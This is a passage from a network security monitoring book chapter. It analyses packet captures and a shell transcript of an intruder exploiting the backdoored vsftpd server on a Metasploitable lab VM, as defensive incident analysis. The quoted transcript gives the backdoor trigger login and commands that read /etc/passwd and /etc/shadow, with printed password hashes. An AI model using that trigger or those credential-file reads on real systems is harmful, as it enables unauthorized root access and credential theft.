- en: 'FTP 76 Request: PASS azzy'
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 10-5: 203.0.113.10 logs in to the FTP server at 192.168.3.5\.*'
  prefs: []
  type: TYPE_NORMAL
- en: Server-side Compromise **217**
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: In Listing 10-5, we see that 203.0.113.10 u connects to the FTP service on port
    21 TCP v on 192.168.3.5 w. We also see user 0M:) x log in and
  prefs: []
  type: TYPE_NORMAL
- en: provide the password azz y. Listing 10-6 shows the consequence of the suc-
  prefs: []
  type: TYPE_NORMAL
- en: cessful login.
  prefs: []
  type: TYPE_NORMAL
- en: 6600 2013-03-09 21:38:38.166971 203.0.113.10u -> 192.168.3.5w
  prefs: []
  type: TYPE_NORMAL
- en: TCP 74 60155 > 6200v [SYN] Seq=0 Win=14600 Len=0 MSS=1460
  prefs: []
  type: TYPE_NORMAL
- en: SACK_PERM=1 TSval=695392 TSecr=0 WS=16
  prefs: []
  type: TYPE_NORMAL
- en: 6601 2013-03-09 21:38:38.166978 192.168.3.5 -> 203.0.113.10
  prefs: []
  type: TYPE_NORMAL
- en: TCP 74 6200 > 60155 [SYN, ACK]x Seq=0 Ack=1 Win=5792 Len=0 MSS=1460
  prefs: []
  type: TYPE_NORMAL
- en: SACK_PERM=1 TSval=276175 TSecr=695392 WS=32
  prefs: []
  type: TYPE_NORMAL
- en: 6602 2013-03-09 21:38:38.168296 203.0.113.10 -> 192.168.3.5
  prefs: []
  type: TYPE_NORMAL
- en: TCP 66 60155 > 6200 [ACK] Seq=1 Ack=1 Win=14608 Len=0 TSval=695392 TSecr=276175
  prefs: []
  type: TYPE_NORMAL
- en: 6603 2013-03-09 21:38:38.168738 203.0.113.10 -> 192.168.3.5
  prefs: []
  type: TYPE_NORMAL
- en: TCP 69 60155 > 6200 [PSH, ACK] Seq=1 Ack=1 Win=14608 Len=3 TSval=695392 TSecr=276175
  prefs: []
  type: TYPE_NORMAL
- en: 6604 2013-03-09 21:38:38.168775 192.168.3.5 -> 203.0.113.10
  prefs: []
  type: TYPE_NORMAL
- en: TCP 66 6200 > 60155 [ACK] Seq=1 Ack=4 Win=5792 Len=0 TSval=276175 TSecr=695392
  prefs: []
  type: TYPE_NORMAL
- en: '*-- snip --*'
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 10-6: 203.0.113.10 connects to port 6200 TCP on 192.168.3.5\.*'
  prefs: []
  type: TYPE_NORMAL
- en: Immediately, before tearing down the connection to the FTP server,
  prefs: []
  type: TYPE_NORMAL
- en: we see a new connection from 203.0.113.10 u to port 6200 TCP v on
  prefs: []
  type: TYPE_NORMAL
- en: 192.168.3.5 w. This time, unlike in Listing 10-4, port 6200 TCP is listen-
  prefs: []
  type: TYPE_NORMAL
- en: ing, and it accepts the connection by replying with SYN, ACK x.
  prefs: []
  type: TYPE_NORMAL
- en: This sequence of events shows that port 6200 TCP was not actively accept-
  prefs: []
  type: TYPE_NORMAL
- en: ing connections until 203.0.113.10 logged in to the FTP server and provided
  prefs: []
  type: TYPE_NORMAL
- en: the proper username and password.
  prefs: []
  type: TYPE_NORMAL
- en: '***Understanding the Backdoor***'
  prefs: []
  type: TYPE_NORMAL
- en: This pattern indicates that the FTP server at 192.168.3.5 was coded with a
  prefs: []
  type: TYPE_NORMAL
- en: backdoor watching for a certain username and password. In our case, we
  prefs: []
  type: TYPE_NORMAL
- en: saw user 0M:) and password azz.
  prefs: []
  type: TYPE_NORMAL
- en: It turns out that 192.168.3.5 was running a version of the vsftpd FTP
  prefs: []
  type: TYPE_NORMAL
- en: server that contained an unauthorized backdoor, as reported in July 2011
  prefs: []
  type: TYPE_NORMAL
- en: by vsftpd developer Chris Evans ( *http://scarybeastsecurity.blogspot.com/2011/07/*
  prefs: []
  type: TYPE_NORMAL
- en: '*alert-vsftpd-download-backdoored.html*). No details on how the code was'
  prefs: []
  type: TYPE_NORMAL
- en: backdoored appear in the blog post, but the net effect was availability of
  prefs: []
  type: TYPE_NORMAL
- en: software that contained a serious security flaw. Users who enter a username
  prefs: []
  type: TYPE_NORMAL
- en: ending in a smiley face (like :)) will enjoy the ability to connect to a back-
  prefs: []
  type: TYPE_NORMAL
- en: door on the FTP server. Figure 10-10 summarizes the situation and adds
  prefs: []
  type: TYPE_NORMAL
- en: specific details for this case.
  prefs: []
  type: TYPE_NORMAL
- en: Why did the logs show records involving port 6200 TCP before the suc-
  prefs: []
  type: TYPE_NORMAL
- en: cessful exploitation of the FTP server? As we saw in the full content data
  prefs: []
  type: TYPE_NORMAL
- en: rendered by Tshark, the FTP connection happened before the backdoor
  prefs: []
  type: TYPE_NORMAL
- en: connection. Apparently, the tools used to log the alert and session data
  prefs: []
  type: TYPE_NORMAL
- en: couldn’t differentiate between the start times for these connections, and
  prefs: []
  type: TYPE_NORMAL
- en: '**218** Chapter 10'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: they logged them out of order. This happens occasionally when performing NSM.
    This phenomenon helps support the idea of collecting multiple NSM
  prefs: []
  type: TYPE_NORMAL
- en: datatypes. When something doesn’t look quite right, you can compare dif-
  prefs: []
  type: TYPE_NORMAL
- en: ferent datatypes to better determine what really happened.
  prefs: []
  type: TYPE_NORMAL
- en: 1\. Intruder initiates attack against exposed,
  prefs: []
  type: TYPE_NORMAL
- en: vulnerable application on victim system.
  prefs: []
  type: TYPE_NORMAL
- en: NETWORK CONNECTION to port 21 TCP
  prefs: []
  type: TYPE_NORMAL
- en: Intruder
  prefs: []
  type: TYPE_NORMAL
- en: Victim
  prefs: []
  type: TYPE_NORMAL
- en: 203.0.113.10
  prefs: []
  type: TYPE_NORMAL
- en: 192.168.3.5
  prefs: []
  type: TYPE_NORMAL
- en: 2\. Attack method exploits vulnerable application
  prefs: []
  type: TYPE_NORMAL
- en: on victim system to execute code or commands.
  prefs: []
  type: TYPE_NORMAL
- en: vsftpd
  prefs: []
  type: TYPE_NORMAL
- en: Exploited
  prefs: []
  type: TYPE_NORMAL
- en: user 0M:)
  prefs: []
  type: TYPE_NORMAL
- en: pass azz
  prefs: []
  type: TYPE_NORMAL
- en: NETWORK CONNECTION to port 6200 TCP
  prefs: []
  type: TYPE_NORMAL
- en: Intruder
  prefs: []
  type: TYPE_NORMAL
- en: Victim
  prefs: []
  type: TYPE_NORMAL
- en: 203.0.113.10
  prefs: []
  type: TYPE_NORMAL
- en: 192.168.3.5
  prefs: []
  type: TYPE_NORMAL
- en: '3\. Malicious code interacts with intruder:'
  prefs: []
  type: TYPE_NORMAL
- en: Intruder initiates new connection to
  prefs: []
  type: TYPE_NORMAL
- en: backdoor created by malicious code.
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 10-10: Server-side at ack involving exploitation of vulnerable vsftpd
    server*'
  prefs: []
  type: TYPE_NORMAL
- en: '***What Did the Intruder Do?***'
  prefs: []
  type: TYPE_NORMAL
- en: Having confirmed that a malicious act took place, we need to understand
  prefs: []
  type: TYPE_NORMAL
- en: its impact. This scenario appears to be at least a Breach 3 incident, because
  prefs: []
  type: TYPE_NORMAL
- en: an intruder has established a C2 channel from his computer to the victim.
  prefs: []
  type: TYPE_NORMAL
- en: How can we find out how bad things are?
  prefs: []
  type: TYPE_NORMAL
- en: We’ve seen a GPL ATTACK_RESPONSE alert indicating id check returned root.
  prefs: []
  type: TYPE_NORMAL
- en: We also know that port 6200 TCP is the C2 channel. We might be able to
  prefs: []
  type: TYPE_NORMAL
- en: learn what the intruder is doing by generating a transcript for this connec-
  prefs: []
  type: TYPE_NORMAL
- en: tion, either through the GPL ATTACK_RESPONSE alert or by using the session
  prefs: []
  type: TYPE_NORMAL
- en: data from 203.0.113.10 to port 6200 TCP on 192.168.3.5\. We can examine
  prefs: []
  type: TYPE_NORMAL
- en: the contents of that session in detail by generating a transcript, as you’ll
    see
  prefs: []
  type: TYPE_NORMAL
- en: in the following section. This examination should give us a better sense of
  prefs: []
  type: TYPE_NORMAL
- en: what the intruder is doing.
  prefs: []
  type: TYPE_NORMAL
- en: '**Initial access**'
  prefs: []
  type: TYPE_NORMAL
- en: The transcript for activity from 203.0.113.10 to 192.168.3.5, shown in
  prefs: []
  type: TYPE_NORMAL
- en: Listing 10-7, shows a variety of events. We can’t be sure if an intruder is
  prefs: []
  type: TYPE_NORMAL
- en: interacting with the system in a live manner or if he is executing an auto-
  prefs: []
  type: TYPE_NORMAL
- en: mated attack. What matters, though, are the consequences of the activities.
  prefs: []
  type: TYPE_NORMAL
- en: Server-side Compromise **219**
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: 'Sensor Name: sovm-eth1-1'
  prefs: []
  type: TYPE_NORMAL
- en: 'Timestamp: 2013-03-09 21:38:38'
  prefs: []
  type: TYPE_NORMAL
- en: 'Connection ID: .sovm-eth1-1_6012'
  prefs: []
  type: TYPE_NORMAL
- en: 'Src IP: 203.0.113.10u (Unknown)'
  prefs: []
  type: TYPE_NORMAL
- en: 'Dst IP: 192.168.3.5v (Unknown)'
  prefs: []
  type: TYPE_NORMAL
- en: 'Src Port: 60155'
  prefs: []
  type: TYPE_NORMAL
- en: 'Dst Port: 6200'
  prefs: []
  type: TYPE_NORMAL
- en: 'OS Fingerprint: 203.0.113.10:60155 - UNKNOWN [S10:63:1:60:M1460,S,T,N,W4:.:?:?]
    (up: 1 hrs) OS Fingerprint: -> 192.168.3.5:6200 (link: ethernet/modem)'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: idw'
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: uid=0(root) gid=0(root) x'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: nohup >/dev/null 2>&1'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: echo T33KwxKuFgj4Uhy7'
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: T33KwxKuFgj4Uhy7'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: whoamiy'
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: rootz'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: echo 3816568630;echo hJZeerbzDFqlJEwWxlyePwOzBhEhQYbN'
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: 3816568630'
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: hJZeerbzDFqlJEwWxlyePwOzBhEhQYbN'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: id -u{ ;echo idGIIxVuiPbrznIwlhwdADqMpAAyLIlj}'
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: 0|'
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: idGIIxVuiPbrznIwlhwdADqMpAAyLIlj'
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 10-7: The beginning of the transcript showing activity from 203.0.113.10
    to 192.168.3.5*'
  prefs: []
  type: TYPE_NORMAL
- en: The first part of the transcript shows 203.0.113.10 u as the source (SRC)
  prefs: []
  type: TYPE_NORMAL
- en: IP address, and 192.168.3.5 v as the destination (DST) IP address. The
  prefs: []
  type: TYPE_NORMAL
- en: intruder, or code executed by the intruder, runs the Unix id command w
  prefs: []
  type: TYPE_NORMAL
- en: to determine the privileges that the channel currently provides. The result
  prefs: []
  type: TYPE_NORMAL
- en: indicates that this is a root-level account x. We see confirmation of the user
  prefs: []
  type: TYPE_NORMAL
- en: 'account with the whoami command y and its corresponding result: root z.'
  prefs: []
  type: TYPE_NORMAL
- en: Now, using the id command with the -u switch {, the intruder sees the effec-
  prefs: []
  type: TYPE_NORMAL
- en: tive user ID of 0 |, which is again associated with root access. The intruder
  prefs: []
  type: TYPE_NORMAL
- en: or his script appears to be using echo statements with long strings } to mark
  prefs: []
  type: TYPE_NORMAL
- en: certain places in the flow of activity on the system.
  prefs: []
  type: TYPE_NORMAL
- en: '**Enumerating the Victim**'
  prefs: []
  type: TYPE_NORMAL
- en: The transcript continues as shown in Listing 10-8\. After running some basic
  prefs: []
  type: TYPE_NORMAL
- en: commands, the intruder spends more time learning about the victim.
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: /usr/sbin/dmidecodeu ;echo WqyRBNDvoqzwtPMOWXAZNDHVcqKrjVOA'
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: # dmidecode 2.9'
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: SMBIOS 2.4 present.'
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: 364 structures occupying 16040 bytes.'
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: Table at 0x000E0010\.'
  prefs: []
  type: TYPE_NORMAL
- en: '*-- snip --*'
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: Handle 0x016B, DMI type 127, 4 bytes'
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: End Of Table'
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: WqyRBNDvoqzwtPMOWXAZNDHVcqKrjVOA'
  prefs: []
  type: TYPE_NORMAL
- en: '**220** Chapter 10'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: ls /etcv ;echo PZhfAinSgdJcyhYaCgAcFDjvciEFALXs'
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: X11'
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: adduser.conf'
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: adjtime'
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: aliases'
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: aliases.db'
  prefs: []
  type: TYPE_NORMAL
- en: '*-- snip --*'
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: wgetrc'
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: wpa_supplicant'
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: xinetd.conf'
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: xinetd.d'
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: zsh_command_not_found'
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: PZhfAinSgdJcyhYaCgAcFDjvciEFALXs'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: uname -aw ;echo gSQsJbnmNmNLEqElLTNRfxfLUQNndGaS'
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008'
  prefs: []
  type: TYPE_NORMAL
- en: i686 GNU/Linuxx
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: gSQsJbnmNmNLEqElLTNRfxfLUQNndGaS'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: cat ''/etc/issue''y;echo KoDdtYNGyWHGPIkHITZtMAYrhsyckIIC'
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: _ _ _ _ _ _ ____'
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: _ __ ___ ___| |_ __ _ ___ _ __ | | ___ (_) |_ __ _| |__ | | ___|___ \'
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: | ''_ ` _ \ / _ \ __/ _` / __| ''_ \| |/ _ \| | __/ _` | ''_ \| |/ _ \
    __) |'
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: | | | | | | __/ || (_| \__ \ |_) | | (_) | | || (_| | |_) | | __// __/'
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: |_| |_| |_|\___|\__\__,_|___/ .__/|_|\___/|_|\__\__,_|_.__/|_|\___|_____|'
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: |_|'
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: Warning: Never expose this VM to an untrusted network!'
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: Contact: msfdev[at]metasploit.com'
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: Login with msfadmin/msfadmin to get startedz'
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: KoDdtYNGyWHGPIkHITZtMAYrhsyckIIC'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: hostname{;echo SBRTSpmkeFZNpuHOMmcQUhMbnPnbNWPQ'
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: metasploitable'
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: SBRTSpmkeFZNpuHOMmcQUhMbnPnbNWPQ'
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 10-8: Victim enumeration*'
  prefs: []
  type: TYPE_NORMAL
- en: The intruder, or his script, enumerates various aspects of the victim
  prefs: []
  type: TYPE_NORMAL
- en: system. He begins with the dmidecode command u to learn more about the
  prefs: []
  type: TYPE_NORMAL
- en: platform itself. Next, he retrieves a directory listing of */etc* v, where many
    key system configuration files reside. Using the uname command w, he discovers
    which kernel version x the system is running. Displaying the con-
  prefs: []
  type: TYPE_NORMAL
- en: tents of the *issue* file shows text that appears after a user logs in z. Finally,
    the intruder reads the victim’s hostname {. The host system is running
  prefs: []
  type: TYPE_NORMAL
- en: a Linux distribution called Metasploitable, which is a tool used to learn
  prefs: []
  type: TYPE_NORMAL
- en: digital attack and defense, developed by the Metasploit team at Rapid7
  prefs: []
  type: TYPE_NORMAL
- en: ( *http://sourceforge.net/projects/metasploitable/files/Metasploitable2/*).
    Defenders use Metasploitable for training when performing security assessments
  prefs: []
  type: TYPE_NORMAL
- en: because Metasploitable has nothing but vulnerabilities—making it perfect
  prefs: []
  type: TYPE_NORMAL
- en: for anyone who wants to test the effectiveness of detection systems.
  prefs: []
  type: TYPE_NORMAL
- en: Apparently someone working at Vivian’s Pets downloaded Metasploitable,
  prefs: []
  type: TYPE_NORMAL
- en: installed it on the test network, and left it exposed to the Internet. An intruder
  prefs: []
  type: TYPE_NORMAL
- en: from IP address 203.0.113.10 found the computer, exploited the vulnerable
  prefs: []
  type: TYPE_NORMAL
- en: vsftpd server on it, and enumerated key aspects of the computer.
  prefs: []
  type: TYPE_NORMAL
- en: Server-side Compromise **221**
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '**accessing Credentials**'
  prefs: []
  type: TYPE_NORMAL
- en: In the last part of the transcript, the intruder turns to files where user cre-
  prefs: []
  type: TYPE_NORMAL
- en: dentials are stored, as shown in Listing 10-9\.
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: cat ''/etc/passwd''u;echo nRVObgMSefnPCAljIfCKrtCxyxAFwbXo'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC:'
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: root:x:0:0:rootv:/root:/bin/bash'
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: daemon:x:1:1:daemon:/usr/sbin:/bin/sh'
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: bin:x:2:2:bin:/bin:/bin/sh'
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: sys:x:3:3:sys:/dev:/bin/sh'
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: sync:x:4:65534:sync:/bin:/bin/sync'
  prefs: []
  type: TYPE_NORMAL
- en: '*-- snip --*'
  prefs: []
  type: TYPE_NORMAL
- en: 'DST:'
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: nRVObgMSefnPCAljIfCKrtCxyxAFwbXo'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: cat ''/etc/shadoww'';echo YMIULmTNrfStudFPMoeddbhSAwYHGUKY'
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:14747:0:99999:7:::x'
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: daemon:*:14684:0:99999:7:::'
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: bin:*:14684:0:99999:7:::'
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: sys:$1$fUX6BPOt$Miyc3UpOzQJqz4s5wFD9l0:14742:0:99999:7:::'
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: sync:*:14684:0:99999:7:::'
  prefs: []
  type: TYPE_NORMAL
- en: '*-- snip --*'
  prefs: []
  type: TYPE_NORMAL
- en: 'DST:'
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: CKNszVzdeRiiApmbrdHsuAolRXRtIFfF'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: ping -c 1 www.google.comy'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC:'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: pwd'
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC:'
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: ping: unknown host www.google.comz'
  prefs: []
  type: TYPE_NORMAL
- en: 'DST:'
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 10-9: Viewing the* /etc passwd *and* /etc/shadow *files*'
  prefs: []
  type: TYPE_NORMAL
- en: In the final part of the transcript, the intruder displays the contents of
  prefs: []
  type: TYPE_NORMAL
- en: 'two key system files: */etc/passwd* u and */etc/shadow* w. The */etc/passwd*
    file contains information about users, such as root v, and the */etc/shadow* file
    stores hashes of the users’ passwords x. The transcript ends with the intruder
    or his'
  prefs: []
  type: TYPE_NORMAL
- en: script trying to ping *www.google.com* y, which fails z.
  prefs: []
  type: TYPE_NORMAL
- en: It is disturbing to see the intruder list the */etc/passwd* and */etc/shadow*
    files containing usernames and hashed passwords for the system. If he breaks
  prefs: []
  type: TYPE_NORMAL
